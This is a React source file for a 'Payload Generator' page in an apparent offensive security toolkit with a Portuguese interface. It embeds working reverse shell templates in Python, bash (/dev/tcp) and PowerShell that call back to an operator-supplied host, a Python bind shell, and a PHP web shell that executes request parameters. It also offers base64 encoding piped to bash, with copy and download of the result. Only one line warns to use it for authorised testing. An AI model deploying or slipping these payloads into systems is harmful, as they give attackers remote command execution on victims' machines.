import { useState } from "react"
import { motion } from "framer-motion"
import { SidebarProvider, SidebarTrigger } from "@/components/ui/sidebar"
import { CerberusSidebar } from "@/components/CerberusSidebar"
import { StarfieldBackground } from "@/components/StarfieldBackground"
import { ToolDetailLayout, ToolSection, ResultsPanel } from "@/components/ToolDetailLayout"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { useCerberusStore } from "@/store/cerberus-store"
import { Package, Code, Copy, Download, Settings } from "lucide-react"
import { useToast } from "@/hooks/use-toast"

export default function PayloadGeneratorTool() {
  const { addLog } = useCerberusStore()
  const { toast } = useToast()
  const [payloadType, setPayloadType] = useState("reverse-shell")
  const [platform, setPlatform] = useState("linux")
  const [language, setLanguage] = useState("python")
  const [lhost, setLhost] = useState("")
  const [lport, setLport] = useState("4444")
  const [encoding, setEncoding] = useState("none")
  const [isGenerating, setIsGenerating] = useState(false)
  const [generatedCode, setGeneratedCode] = useState("")

  const payloadTemplates: Record<string, Record<string, string>> = {
    "reverse-shell": {
      python: `import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("${lhost}",${lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])`,
      bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
      powershell: `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}`
    },
    "bind-shell": {
      python: `import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",${lport}))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])`
    },
    "web-shell": {
      php: `<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<html>
<body>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
</body>
</html>`
    }
  }

  const generatePayload = async () => {
    if (!lhost.trim() && payloadType === "reverse-shell") {
      addLog({ level: 'warning', source: 'Payload Generator', message: 'Digite o LHOST (seu IP)' })
      return
    }

    setIsGenerating(true)
    addLog({
      level: 'info',
      source: 'Payload Generator',
      message: `Gerando payload: ${payloadType} (${language})`
    })

    await new Promise(resolve => setTimeout(resolve, 1500))

    const template = payloadTemplates[payloadType]?.[language] || 
                     payloadTemplates[payloadType]?.python || 
                     "# Payload não disponível para esta combinação"

    let finalCode = template

    // Apply encoding
    if (encoding === "base64") {
      finalCode = `# Base64 Encoded Payload\n# Decode with: echo "${Buffer.from(finalCode).toString('base64')}" | base64 -d | bash\n\n${finalCode}`
    } else if (encoding === "hex") {
      finalCode = `# Hex Encoded Payload\n${finalCode}`
    }

    setGeneratedCode(finalCode)
    setIsGenerating(false)

    addLog({
      level: 'success',
      source: 'Payload Generator',
      message: 'Payload gerado com sucesso!'
    })
  }

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedCode)
    toast({
      title: "Copiado!",
      description: "Payload copiado para a área de transferência",
    })
    addLog({ level: 'info', source: 'Payload Generator', message: 'Payload copiado para clipboard' })
  }

  const downloadPayload = () => {
    const fileExtensions: Record<string, string> = {
      python: 'py',
      bash: 'sh',
      powershell: 'ps1',
      php: 'php'
    }
    
    const ext = fileExtensions[language] || 'txt'
    const blob = new Blob([generatedCode], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.download = `payload_${payloadType}_${Date.now()}.${ext}`
    link.click()

    addLog({ level: 'success', source: 'Payload Generator', message: 'Payload baixado com sucesso' })
  }

  return (
    <div className="min-h-screen bg-background relative">
      <StarfieldBackground />
      <SidebarProvider>
        <div className="flex w-full min-h-screen">
          <CerberusSidebar />
          
          <div className="flex-1 flex flex-col relative z-10">
            <header className="h-16 border-b border-foreground/10 bg-background/80 backdrop-blur-xl flex items-center px-6">
              <SidebarTrigger className="mr-4" />
            </header>

            <main className="flex-1 p-6">
              <ToolDetailLayout
                title="Payload Generator"
                description="Gere payloads customizados para reverse shells, bind shells e web shells com diferentes linguagens e opções de encoding."
                icon={<Package className="h-6 w-6 text-primary" />}
                category="Payload Creation"
                difficulty="Medium"
                onExecute={generatePayload}
                isExecuting={isGenerating}
                hasResults={!!generatedCode}
              >
                {/* Configuration */}
                <ToolSection title="Configuração do Payload" icon={<Settings className="h-5 w-5" />}>
                  <div className="space-y-4">
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="payloadType">Tipo de Payload</Label>
                        <Select value={payloadType} onValueChange={setPayloadType}>
                          <SelectTrigger id="payloadType" className="bg-terminal-bg border-glass-border">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="reverse-shell">Reverse Shell</SelectItem>
                            <SelectItem value="bind-shell">Bind Shell</SelectItem>
                            <SelectItem value="web-shell">Web Shell</SelectItem>
                            <SelectItem value="meterpreter">Meterpreter</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="platform">Plataforma</Label>
                        <Select value={platform} onValueChange={setPlatform}>
                          <SelectTrigger id="platform" className="bg-terminal-bg border-glass-border">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="linux">Linux</SelectItem>
                            <SelectItem value="windows">Windows</SelectItem>
                            <SelectItem value="macos">macOS</SelectItem>
                            <SelectItem value="android">Android</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="language">Linguagem</Label>
                        <Select value={language} onValueChange={setLanguage}>
                          <SelectTrigger id="language" className="bg-terminal-bg border-glass-border">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="python">Python</SelectItem>
                            <SelectItem value="bash">Bash</SelectItem>
                            <SelectItem value="powershell">PowerShell</SelectItem>
                            <SelectItem value="php">PHP</SelectItem>
                            <SelectItem value="perl">Perl</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <div className="space-y-2 md:col-span-2">
                        <Label htmlFor="lhost">LHOST (Seu IP)</Label>
                        <Input
                          id="lhost"
                          placeholder="192.168.1.100"
                          value={lhost}
                          onChange={(e) => setLhost(e.target.value)}
                          className="bg-terminal-bg border-glass-border font-mono"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="lport">LPORT (Porta)</Label>
                        <Input
                          id="lport"
                          placeholder="4444"
                          value={lport}
                          onChange={(e) => setLport(e.target.value)}
                          className="bg-terminal-bg border-glass-border font-mono"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="encoding">Encoding</Label>
                      <Select value={encoding} onValueChange={setEncoding}>
                        <SelectTrigger id="encoding" className="bg-terminal-bg border-glass-border">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="none">Nenhum</SelectItem>
                          <SelectItem value="base64">Base64</SelectItem>
                          <SelectItem value="hex">Hexadecimal</SelectItem>
                          <SelectItem value="url">URL Encode</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </div>
                </ToolSection>

                {/* Generated Code */}
                {generatedCode ? (
                  <ResultsPanel>
                    <div className="space-y-4">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-2">
                          <Code className="h-5 w-5 text-primary" />
                          <h3 className="font-semibold text-foreground">Código Gerado</h3>
                          <Badge className="bg-blue-900/50 text-blue-400 border-blue-800">
                            {language}
                          </Badge>
                        </div>
                        <div className="flex space-x-2">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={copyToClipboard}
                            className="border-glass-border hover:border-primary/30"
                          >
                            <Copy className="h-4 w-4 mr-2" />
                            Copiar
                          </Button>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={downloadPayload}
                            className="border-glass-border hover:border-primary/30"
                          >
                            <Download className="h-4 w-4 mr-2" />
                            Baixar
                          </Button>
                        </div>
                      </div>

                      <div className="relative">
                        <Textarea
                          value={generatedCode}
                          readOnly
                          className="font-mono text-sm bg-terminal-bg border-glass-border min-h-[300px] text-green-400"
                        />
                      </div>

                      <div className="p-4 bg-yellow-900/20 border border-yellow-900/50 rounded-lg">
                        <p className="text-sm text-yellow-400">
                          ⚠️ <strong>Aviso:</strong> Use este payload apenas em ambientes autorizados para testes de penetração.
                        </p>
                      </div>
                    </div>
                  </ResultsPanel>
                ) : !isGenerating && (
                  <ResultsPanel isEmpty />
                )}
              </ToolDetailLayout>
            </main>
          </div>
        </div>
      </SidebarProvider>
    </div>
  )
}
